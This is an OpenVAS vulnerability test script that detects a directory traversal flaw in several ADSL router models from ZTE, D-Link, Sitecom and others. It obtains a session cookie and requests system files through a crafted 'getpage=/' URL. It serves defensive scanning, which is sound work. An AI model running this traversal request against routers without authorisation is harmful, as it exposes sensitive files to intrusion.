###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mult_router_traversal_03_15.nasl 11831 2018-10-11 07:49:24Z jschulte $
#
# Multiple ADSL Routers Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105242");
  script_version("$Revision: 11831 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2015-7252", "CVE-2015-7251", "CVE-2015-7250", "CVE-2015-7249",
               "CVE-2015-7248");
  script_name("Multiple ADSL Routers Directory Traversal Vulnerability");
  script_xref(name:"URL", value:"http://blog.norsecorp.com/2015/03/20/over-700000-adsl-routers-shipped-with-directory-traversal-vulnerability/");

  script_tag(name:"impact", value:"A remote attacker could exploit the vulnerability to access arbitrary files that contain
  sensitive information. Information harvested may aid in launching further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Multiple ADSL routers are prone to a directory-traversal vulnerability
  because they fail to properly sanitize user-supplied input.");

  script_tag(name:"affected", value:"At least the following routeri models are vulnerable:
  ZTE H108N
  ZTE H108NV2.1
  D-Link 2750E
  D-Link 2730U
  D-Link 2730E
  Sitecom WLM-3600
  Sitecom WLR-6100
  Sitecom WLR-4100
  FiberHome HG110
  Planet ADN-4101
  Digisol DG-BG4011N
  Observa Telecom BHS_RTA_R1A");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-03-23 10:41:22 +0100 (Mon, 23 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:8080 );

url = '/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "200 OK" >< buf && "set-cookie" >< tolower( buf ) && "sessionid" >< buf )
{
  files = traversal_files("linux");

  cookie = eregmatch( pattern:'set-cookie: sessionid=([^ ;]+)', string:buf, icase:TRUE );
  if( isnull( cookie[1] ) ) exit( 0 );

  foreach pattern( keys( files ) ) {

    file = files[pattern];

    url = '/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/' + file;

    if( http_vuln_check( port:port, url:url, pattern:pattern, cookie:'sessionid=' + cookie[1] ) )
    {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );

